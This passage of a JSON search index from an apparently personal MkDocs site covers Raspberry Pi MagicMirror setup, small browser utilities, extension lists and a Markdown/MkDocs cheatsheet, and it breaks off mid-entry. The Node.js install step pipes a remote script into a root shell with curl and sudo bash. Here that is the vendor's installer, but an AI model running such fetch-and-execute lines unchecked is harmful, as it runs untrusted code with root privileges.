"raspberry-pi/projects/magic-mirror/#change-display-rotation", "title": "Change Display Rotation", "text": "<pre><code>sudo nano /boot/config.txt\n</code></pre> <p>Add one of those according to your setup to the config file:</p> Code Description display_rotate=0 Normal display_rotate=1 90 degrees display_rotate=2 180 degrees display_rotate=3 270 degrees display_rotate=0x8000 horizontal flip display_rotate=0x20000 vertical flip <p><code>NOTE: You can rotate both the image and touch interface 180\u00ba by entering lcd_rotate=2 instead</code></p>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#disabling-the-screensaver", "title": "Disabling the Screensaver", "text": "<p>Change to OPEN GL Driver</p> <pre><code>sudo nano /boot/config.txt\n</code></pre> <p>add this:</p> <pre><code>dtoverlay=vc4-fkms-v3d\n</code></pre> <p>(Please note, you will need the x11-xserver-utils package installed.)</p> <p>edit ~/.config/lxsession/LXDE-pi/autostart:</p> <pre><code>sudo nano ~/.config/lxsession/LXDE-pi/autostart\n</code></pre> <p>Add the following lines:</p> <pre><code>@xset s noblank\n@xset s off\n@xset -dpms\n</code></pre> <p>Edit /etc/lightdm/lightdm.conf:</p> <pre><code>sudo nano /etc/lightdm/lightdm.conf\n</code></pre> <p>Add the following line below [SeatDefaults]</p> <pre><code>xserver-command=X -s 0 -dpms\n</code></pre>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#os-ui-finishes", "title": "OS UI Finishes", "text": "<p>Make the Background Black:</p> <p><code>Right click the Desktop</code> -&gt; <code>Desktop Preferences</code> and Change: <code>Layout -&gt; no image</code> <code>Colour -&gt; #000000</code></p> <p>Hit ok.</p> <p><code>Right click on the top panel</code> -&gt; <code>Panel Preferences</code> -&gt; <code>Appearance</code></p> <p>Select <code>Solid Color (With Opacity)</code> make sure <code>Opacity at 0</code></p>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#disable-wifi-power-save", "title": "Disable WiFi Power Save", "text": "<p>Edit /etc/modprobe.d/8192cu.conf</p> <pre><code>sudo nano /etc/modprobe.d/8192cu.conf\n</code></pre> <p>Add the following lines</p> <pre><code># Disable power saving\noptions 8192cu rtw_power_mgnt=0 rtw_enusbss=1 rtw_ips_mode=1\n</code></pre> <p>For Raspberry Pi 3 Edit /etc/network/interfaces</p> <pre><code>sudo nano /etc/network/interfaces\n</code></pre> <p>Add the following line under the wlan0 section</p> <pre><code>allow-hotplug wlan0\niface wlan0 inet manual\nwpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\nwireless-power off\n</code></pre> <p>Reboot your PI</p> <pre><code>sudo reboot\n</code></pre>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#disable-cursor-on-startup", "title": "Disable Cursor on Startup", "text": "<pre><code>sudo apt-get install unclutter\n</code></pre>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#installation", "title": "Installation", "text": "<p>first install node.js and npm</p> <pre><code>curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -\nsudo apt-get install -y nodejs\n</code></pre> <p>and then run:</p> <pre><code>sudo npm install -g npm@latest\n</code></pre> <p>If you need to remove node and npm run this:</p> <pre><code>sudo apt-get remove nodejs nodejs-legacy nodered\n</code></pre> <p>Installation:</p> <p>magicmirror-installation</p> <p><code>say no to PM2 auto start - will be install manually</code></p> <p>To Start from SSH:</p> <pre><code>cd ~/MagicMirror &amp;&amp; DISPLAY=:0 npm start\n</code></pre>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#pm2-auto-start-installation", "title": "pm2 auto start installation", "text": "<pre><code>sudo npm install -g pm2\ncd ~\nnano mm.sh\n</code></pre> <p>add this to mm.sh and save:</p> <pre><code>#!/bin/sh\n\ncd ~/MagicMirror\nDISPLAY=:0 npm start\n</code></pre> <pre><code>chmod +x mm.sh\npm2 start mm.sh\npm2 save\npm2 startup\n</code></pre> <p>pm2 commands:</p> <pre><code>pm2 restart mm\npm2 stop mm\npm2 start mm\npm2 log\npm2 show mm\n</code></pre>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "raspberry-pi/projects/magic-mirror/#logrotate-installation", "title": "Logrotate Installation", "text": "<p>This will Retain for 14 days compress the logs.</p> <pre><code>pm2 install pm2-logrotate\npm2 set pm2-logrotate:compress true\npm2 set pm2-logrotate:retain 14\npm2 set pm2-logrotate:max_size 10M\n</code></pre>", "tags": ["raspberry-pi", "magic-mirror"]}, {"location": "utilities/htpasswd-generator/", "title": "htpasswd Password Generator", "text": "<p>This htpasswd password encryption applet is written in JavaScript, so the entire process runs within your browser.Nothing is transmitted to any server, we take your privacy and securityserious.</p>", "tags": ["htpasswd"]}, {"location": "utilities/htpasswd-generator/#credit-sources", "title": "Credit &amp; Sources", "text": "<p>The code was built by macminiosx and cloned from his repository. It was slightly modified to fit this website.</p>", "tags": ["htpasswd"]}, {"location": "utilities/useful-links-tools/", "title": "Useful Links &amp; Tools", "text": "Services Description Mail-Tester.com Tests the quality of emails ipleak.net Shows Information About Your IP sslLabs.com Test Your SSL Certification ifconfig.io curl ifconfig.io DSL Reports.com Speedtest For QoS Best Configuration Hurricane Electric Free DNS Hosting Free DNS &amp; DDNS Service freedns.afraid.org Free DNS &amp; DDNS Service", "tags": ["utilities"]}, {"location": "utilities/wifiQrGenerator/", "title": "Wifi QR Image Generator", "text": "", "tags": ["utilities"]}, {"location": "utilities/wifiQrGenerator/#description", "title": "Description", "text": "<p>This will generate a QR code what can be used with any iOS/Android device to access a given Wifi without manually adding a network and password. Just scan the QR Code and you are connected. This is a fully static code - no data is send to any server!</p>", "tags": ["utilities"]}, {"location": "utilities/wifiQrGenerator/#generator", "title": "Generator", "text": "", "tags": ["utilities"]}, {"location": "utilities/wifiQrGenerator/#credit-sources", "title": "Credit &amp; Sources", "text": "<p>This code was taken from this site qistoph Github Page. It was fully reviewed for any malicious code or functionality and slightly modified to fit this site</p>", "tags": ["utilities"]}, {"location": "utilities/browsers-extensions/chrome/", "title": "Chrome Extensions", "text": "<p>List of extensions for Chrome browser.</p> Chrome Extensions Description 1Password Password Manager (Desktop App Required) Clear Browsing Data Clear Browsing Data HTTPS Everywhere Automatically use HTTPS uBlock Origin Ad Block EditThisCookie Edit cookie per page Wappalyzer Uncovers the technologies used on websites IP Address and Domain Information Find detailed information about each IP address JSON viewer Pretty print / display JSON content in the browser", "tags": ["chrome", "extensions"]}, {"location": "utilities/browsers-extensions/firefox/", "title": "Firefox Extensions", "text": "<p>List of extensions for Firefox browser.</p> Firefox Extensions Description FoxyProxy Proxy Management Wappalyzer Identifies software on websites Clear Browsing Data Delete browsing data 1Password Password Manager", "tags": ["firefox", "extensions"]}, {"location": "utilities/markdown-cheatsheet/about/", "title": "About Markdown", "text": "<p>Markdown is a lightweight markup language with plain text formatting syntax. It is designed so that it can be converted to HTML and many other formats using a tool by the same name. Markdown is often used to format readme files, for writing messages in online discussion forums, and to create rich text using a plain text editor. As the initial description of Markdown contained ambiguities and unanswered questions, many implementations and extensions of Markdown appeared over the years to answer these issues.</p> <p> This Page is fully written with Markdown Language and converted to HTML</p>", "tags": ["markdown-cheatsheet", "mkdocs"]}, {"location": "utilities/markdown-cheatsheet/about/#material-for-mkdocs-markdown", "title": "Material for MkDocs Markdown", "text": "<p>This website is built with MkDocs. MkDocs is a static site generator that can be used to generate websites with a clean and simple user interface. It is a free and open source project.</p> <p>Warning</p> <p>Most of the advanced features used to generate this website and the Markdown syntax used from Material Theme for MkDocs and may not apply to other websites.</p>", "tags": ["markdown-cheatsheet", "mkdocs"]}, {"location": "utilities/markdown-cheatsheet/admonition/", "title": "Markdown Admonitions", "text": "<p>Admonitions, also known as call-outs, are an excellent choice for including side content without significantly interrupting the document flow. Material for MkDocs provides several different types of admonitions and allows for the inclusion and nesting of arbitrary content.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "admonition"]}, {"location": "utilities/markdown-cheatsheet/admonition/#usage", "title": "Usage", "text": "<p>Admonitions follow a simple syntax: a block starts with <code>!!!</code>, followed by a single keyword used as a [type qualifier]. The content of the block follows on the next line, indented by four spaces:</p> Admonition<pre><code>!!! note\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> <p>Note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "admonition"]}, {"location": "utilities/markdown-cheatsheet/admonition/#changing-the-title", "title": "Changing The Title", "text": "<p>By default, the title will equal the type qualifier in titlecase. However, it can be changed by adding a quoted string containing valid Markdown (including links, formatting, ...) after the type qualifier:</p> Admonition with custom title<pre><code>!!! note \"Phasellus posuere in sem ut cursus\"\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> <p>Phasellus posuere in sem ut cursus</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "admonition"]}, {"location": "utilities/markdown-cheatsheet/admonition/#removing-the-title", "title": "Removing The Title", "text": "<p>Similar to [changing the title], the icon and title can be omitted entirely by adding an empty string directly after the type qualifier. Note that this will not work for [collapsible blocks]:</p> Admonition without title<pre><code>!!! note \"\"\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "admonition"]}, {"location": "utilities/markdown-cheatsheet/admonition/#collapsible-blocks", "title": "Collapsible Blocks", "text": "<p>When [Details] is enabled and an admonition block is started with <code>???</code> instead of <code>!!!</code>, the admonition is rendered as a collapsible block with a small toggle on the right side:</p> Admonition, collapsible<pre><code>??? note\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> Note <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>Adding a <code>+</code> after the <code>???</code> token renders the block expanded:</p> Admonition, collapsible and initially expanded<pre><code>???+ note\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> Note <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "admonition"]}, {"location": "utilities/markdown-cheatsheet/admonition/#supported-types", "title": "Supported Types", "text": "<p>Following is a list of type qualifiers provided by Material for MkDocs, whereas the default type, and thus fallback for unknown type qualifiers, is <code>note</code>:</p> <code>note</code> <p>Note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>abstract</code>, <code>summary</code>, <code>tldr</code> <p>Abstract</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>info</code>, <code>todo</code> <p>Info</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>tip</code>, <code>hint</code>, <code>important</code> <p>Tip</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>success</code>, <code>check</code>, <code>done</code> <p>Success</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>question</code>, <code>help</code>, <code>faq</code> <p>Question</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>warning</code>, <code>caution</code>, <code>attention</code> <p>Warning</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>failure</code>, <code>fail</code>, <code>missing</code> <p>Failure</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>danger</code>, <code>error</code> <p>Danger</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>bug</code> <p>Bug</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>example</code> <p>Example</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <code>quote</code>, <code>cite</code> <p>Quote</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "admonition"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/", "title": "Mkdocs Awesome Pages Plugin", "text": "<p>An MkDocs plugin that simplifies configuring page titles and their order</p> <p>The awesome-pages plugin allows you to customize how your pages show up the navigation of your MkDocs without having to configure the full structure in your mkdocs.yml. It gives you detailed control using a small configuration file directly placed in the relevant directory of your documentation. MkDocs Awesome Pages Plugin Github Repository</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#features", "title": "Features", "text": "", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#customize-navigation", "title": "Customize Navigation", "text": "<p>Create a file named <code>.pages</code> in a directory and use the <code>nav</code> attribute to customize the navigation on that level. List the files and subdirectories in the order that they should appear in the navigation.</p> <pre><code>nav:\n    - subdirectory\n    - page1.md\n    - page2.md\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#rest", "title": "Rest", "text": "<p>Pages or sections that are not mentioned in the list will not appear in the navigation. However, you may include a <code>...</code>  entry to specify where all remaining items should be inserted.</p> <pre><code>nav:\n    - introduction.md\n    - ...\n    - summary.md\n</code></pre> <p>Furthermore, it is possible to filter the remaining items using glob patterns or regular expressions. For example to match only the Markdown files starting with <code>introduction-</code>.</p> <pre><code>nav:\n    - ... | introduction-*.md\n    - ...\n    - summary.md\n</code></pre> <p>Note: The pattern is checked against the basename (folder- / filename) of remaining items - not their whole path.</p> <p>For more details refer to the Rest Filter Patterns section below.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#titles", "title": "Titles", "text": "<p>You can optionally specify a title for the navigation entry.</p> <pre><code>nav:\n    - ...\n    - First page: page1.md\n</code></pre> <p>Note: Specifying a title for a directory containing a <code>.pages</code> file that defines a <code>title</code> has no effect.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#links", "title": "Links", "text": "<p>You can also use the <code>nav</code> attribute to add additional links to the navigation.</p> <pre><code>nav:\n    - ...\n    - Link Title: https://lukasgeiter.com\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#sections", "title": "Sections", "text": "<p>You can group items by creating new sections.</p> <pre><code>nav:\n    - introduction.md\n    - Section 1:\n        - page1.md\n        - page2.md\n    - Section 2:\n        - ...\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#change-sort-order", "title": "Change Sort Order", "text": "<p>Create a file named <code>.pages</code> in a directory and set the <code>order</code> attribute to <code>asc</code> or <code>desc</code> to change the order of navigation items.</p> <pre><code>order: desc\n</code></pre> <p>Note: Unlike the default order, this does not distinguish between files and directories. Therefore pages and sections might get mixed.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#natural-sort-type", "title": "Natural Sort Type", "text": "<p>Create a file named <code>.pages</code> in a directory and set the <code>sort_type</code> attribute to <code>natural</code> to use natural sort order.</p> <p>This can be combined with <code>order</code> above.</p> <pre><code>sort_type: natural\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#order-navigation-by-preference", "title": "Order Navigation By Preference", "text": "<p>Create a file named <code>.pages</code> in a directory and set the <code>order_by</code> attribute to <code>filename</code> or <code>title</code> to change the order of navigation items.</p> <pre><code>order_by: title\n</code></pre> <p>This can be combined with <code>order</code> and/or <code>sort_type</code> above. If <code>order</code> is not set it will order ascending. If no preference is set, it will order by filename.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#collapse-single-nested-pages", "title": "Collapse Single Nested Pages", "text": "<p>Note: This feature is disabled by default. More on how to use it below</p> <p>If you have directories that only contain a single page, awesome-pages can \"collapse\" them, so the folder doesn't show up in the navigation.</p> <p>For example if you have the following file structure:</p> <pre><code>docs/\n\u251c\u2500 section1/\n\u2502  \u251c\u2500 img/\n\u2502  \u2502  \u251c\u2500 image1.png\n\u2502  \u2502  \u2514\u2500 image2.png\n\u2502  \u2514\u2500 index.md # Section 1\n\u2514\u2500 section2/\n   \u2514\u2500 index.md # Section 2\n</code></pre> <p>The pages will appear in your navigation at the root level:</p> <ul> <li>Section 1</li> <li>Section 2</li> </ul> <p>Instead of how MkDocs would display them by default:</p> <ul> <li>Section 1</li> <li>Index</li> <li>Section 2</li> <li>Index</li> </ul>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#for-all-pages", "title": "For all pages", "text": "<p>Collapsing can be enabled globally using the <code>collapse_single_pages</code> option in <code>mkdocs.yml</code></p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#for-a-sub-section", "title": "For a sub-section", "text": "<p>If you only want to collapse certain pages, create a file called <code>.pages</code> in the directory and set <code>collapse_single_pages</code> to <code>true</code>:</p> <pre><code>collapse_single_pages: true\n</code></pre> <p>You may also enable collapsing globally using the plugin option and then use the <code>.pages</code> file to prevent certain sub-sections from being collapsed by setting <code>collapse_single_pages</code> to <code>false</code>.</p> <p>Note: This feature works recursively. That means it will also collapse multiple levels of single pages.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#for-a-single-page", "title": "For a single page", "text": "<p>If you want to enable or disable collapsing of a single page, without applying the setting recursively, create a file called <code>.pages</code> in the directory and set <code>collapse</code> to <code>true</code> or <code>false</code>:</p> <pre><code>collapse: true\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#hide-directory", "title": "Hide Directory", "text": "<p>Create a file named <code>.pages</code> in a directory and set the <code>hide</code> attribute to <code>true</code> to hide the directory, including all sub-pages and sub-sections, from the navigation:</p> <pre><code>hide: true\n</code></pre> <p>Note: This option only hides the section from the navigation. It will still be included in the build and can be accessed under its URL.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#set-directory-title", "title": "Set Directory Title", "text": "<p>Create a file named <code>.pages</code> in a directory and set the <code>title</code> to override the title of that directory in the navigation:</p> <pre><code>title: Page Title\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#arrange-pages", "title": "Arrange Pages", "text": "<p>Deprecated: <code>arrange</code> will be removed in the next major release - Use <code>nav</code> instead.</p> <p>Create a file named <code>.pages</code> in a directory and set the <code>arrange</code> attribute to change the order of how child pages appear in the navigation. This works for actual pages as well as subdirectories.</p> <pre><code>title: Page Title\narrange:\n    - page1.md\n    - page2.md\n    - subdirectory\n</code></pre> <p>If you only specify some pages, they will be positioned at the beginning, followed by the other pages in their original order.</p> <p>You may also include a <code>...</code> entry at some position to specify where the rest of the pages should be inserted:</p> <pre><code>arrange:\n    - introduction.md\n    - ...\n    - summary.md\n</code></pre> <p>In this example <code>introduction.md</code> is positioned at the beginning, <code>summary.md</code> at the end, and any other pages in between.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#combine-custom-navigation-file-structure", "title": "Combine Custom Navigation &amp; File Structure", "text": "<p>MkDocs gives you two ways to define the structure of your navigation. Either create a custom navigation manually in <code>mkdocs.yml</code> or use the file structure to generate the navigation. This feature makes it possible to combine both methods. Allowing you to manually define parts of your navigation without having to list all files.</p> <p>Note: You can freely combine this with all the other features of this plugin. However they will only affect the part of the navigation that is not defined manually.</p> <p>Use the <code>nav</code> entry in <code>mkdocs.yml</code> to define the custom part of your navigation. Include a <code>...</code> entry where you want the navigation tree of all remaining pages to be inserted.</p> <p>The following examples are based on this file structure:</p> <pre><code>docs/\n\u251c\u2500 introduction.md\n\u251c\u2500 page1.md\n\u251c\u2500 page2.md\n\u2514\u2500 folder/\n   \u251c\u2500 introduction.md\n   \u251c\u2500 page3.md\n   \u2514\u2500 page4.md\n</code></pre> <p>If you wanted <code>introduction.md</code>, <code>page1.md</code> and <code>page2.md</code> to appear under their own section you could do this:</p> <pre><code>nav:\n    - Start:\n        - introduction.md\n        - page1.md\n        - page2.md\n    - ...\n</code></pre> <p>Which would result in the following navigation:</p> <ul> <li>Start</li> <li>Introduction</li> <li>Page 1</li> <li>Page 2</li> <li>Folder</li> <li>Introduction</li> <li>Page 3</li> <li>Page 4</li> </ul> <p>The <code>...</code> entry can also be placed at a deeper level:</p> <pre><code>nav:\n    - page1.md\n    - Rest:\n        - ...\n</code></pre> <p>Which would result in the following navigation:</p> <ul> <li>Page 1</li> <li>Rest</li> <li>Introduction</li> <li>Page 2</li> <li>Folder<ul> <li>Introduction</li> <li>Page 3</li> <li>Page 4</li> </ul> </li> </ul> <p>Furthermore, it is possible to filter the remaining items using glob patterns or regular expressions. For example to match only files named <code>introduction.md</code>.</p> <pre><code>nav:\n    - Introductions:\n        - ... | **/introduction.md\n    - ...\n</code></pre> <p>With the following result:</p> <ul> <li>Introductions<ul> <li>Introduction</li> <li>Introduction</li> </ul> </li> <li>Page 1</li> <li>Page 2</li> <li>Folder<ul> <li>Page 3</li> <li>Page 4</li> </ul> </li> </ul> <p>Note: The pattern is checked against the path relative to the docs directory.</p> <p>For more details refer to the Rest Filter Patterns section below.</p> <p>By default, remaining items keep their hierarchical structure. You may add <code>flat</code> to flatten all the matching pages:</p> <pre><code>nav:\n    - page1.md\n    - Rest:\n        - ... | flat | **/introduction.md\n        - ... | flat\n</code></pre> <ul> <li>Page 1</li> <li>Rest<ul> <li>Introduction</li> <li>Introduction</li> <li>Page 2</li> <li>Page 3</li> <li>Page 4</li> </ul> </li> </ul> <p></p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#rest-filter-patterns", "title": "Rest Filter Patterns", "text": "<p>In all places where the rest entry (<code>...</code>) is allowed, you can also include a glob pattern or regular expression to filter the items to be displayed.</p> <pre><code>nav:\n    - ... | page-*.md\n    - ... | regex=page-[0-9]+.md\n</code></pre> <p>The filter only operates on remaining items. This means it will not include items that are explicitly listed in the navigation or items that are matched by another filter that appears earlier in the configuration.</p> <p>You may also include a rest entry without filter to act as a catch-all, inserting everything that is not matched by a filter.</p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#syntax-details", "title": "Syntax Details", "text": "<p>Unless the filter starts with <code>regex=</code> it is interpreted as glob pattern, however you may also explicitly say so using <code>glob=</code>. The spaces around <code>...</code> are optional but recommended for readability.</p> <p>Note: Depending on the characters in your filter, you might also need to use quotes around the whole entry.</p> <pre><code>nav:\n    # equivalent glob entries\n    - ... | page-*.md\n    - ... | glob=page-*.md\n    - ...|page-*.md\n    - '... | page-*.md'\n\n    # equivalent regex entries\n    - ... | regex=page-[0-9]+.md\n    - ...|regex=page-[0-9]+.md\n    - '... | regex=page-[0-9]+.md'\n</code></pre> <p></p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#options", "title": "Options", "text": "<p>You may customize the plugin by passing options in <code>mkdocs.yml</code>:</p> <pre><code>plugins:\n    - awesome-pages:\n        filename: .index\n        collapse_single_pages: true\n        strict: false\n        order: asc\n        sort_type: natural\n        order_by: title\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#filename", "title": "<code>filename</code>", "text": "<p>Name of the file used to configure pages of a directory. Default is <code>.pages</code></p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#collapse_single_pages", "title": "<code>collapse_single_pages</code>", "text": "<p>Enable the collapsing of single nested pages. Default is <code>false</code></p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#strict", "title": "<code>strict</code>", "text": "<p>Raise errors instead of warnings when:</p> <ul> <li><code>arrange</code> entries cannot be found</li> <li><code>nav</code> entries cannot be found</li> </ul> <p>Default is <code>true</code></p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#order-sort_type-and-order_by", "title": "<code>order</code>, <code>sort_type</code> and <code>order_by</code>", "text": "<p>Global fallback values for the Meta attributes. Default is <code>None</code> or <code>filename</code>.</p> <p></p>", "tags": ["template", "markdown"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/", "title": "Markdown Basic Formatting", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#text-styling", "title": "Text Styling", "text": "<p>Markdown makes it easy to format messages. Type a message as you normally would, then use these the following formatting syntax to render the message a specific way</p> Markdown Syntax Result <code>**bold**</code> bold <code>_italic_</code> italic <code>==highlight==</code> highlight <code>~~strike through~~</code> strike through <code>^^underline^^</code> underline <code>`Inline Code`</code> <code>Inline Code</code> <code>==_you_ **can** ^^combine^^ `too`==</code> you can combine <code>too</code>", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#horizontal-line", "title": "Horizontal Line", "text": "Horizontal Line Example<pre><code>Horizontal line\n\n---\n\nThree consecutive dashes\n</code></pre> <p>Result:</p> <p>Horizontal line</p> <p>Three consecutive dashes</p>", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading", "title": "Heading", "text": "<p>To create a heading, add number signs (#) in front of a word or phrase. The number of number signs you use should correspond to the heading level. For example, to create a heading level three (h3), use three number signs (e.g., ### My Header).</p> <p>Headings from <code>h1</code> through <code>h6</code> are constructed with a <code>#</code> for each level:</p>", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#regular-headings", "title": "Regular Headings", "text": "Regular Headings (h1-h6)<pre><code>### Heading 3\n\n#### Heading 4\n\n##### Heading 5\n\n###### Heading 6\n</code></pre> <p>Result:</p>", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-3", "title": "Heading 3", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-4", "title": "Heading 4", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-5", "title": "Heading 5", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-6", "title": "Heading 6", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#headings-with-secondary-text", "title": "Headings with secondary text", "text": "Headings with secondary text (h1-h6)<pre><code>### Heading 3 &lt;small&gt;with secondary text&lt;/small&gt;\n\n#### Heading 4 &lt;small&gt;with secondary text&lt;/small&gt;\n\n##### Heading 5 &lt;small&gt;with secondary 